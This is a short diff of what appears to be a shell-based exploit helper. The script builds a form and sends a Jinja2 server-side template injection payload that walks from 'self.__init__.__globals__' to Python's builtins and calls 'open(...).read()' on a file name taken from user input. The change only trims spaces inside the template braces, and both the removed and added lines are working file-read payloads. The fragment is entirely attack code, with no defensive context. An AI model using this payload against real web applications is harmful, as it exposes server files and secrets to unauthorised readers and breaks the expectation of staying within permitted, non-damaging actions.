@@ -12,4 +12,4 @@ generate_form "${FILE_FIELD}"
 
 FILE=${form_data["file"]}
 
-execute_command "{{ self.__init__.__globals__.__builtins__.open(\"${FILE}\").read() }}"
+execute_command "{{self.__init__.__globals__.__builtins__.open(\"${FILE}\").read()}}"
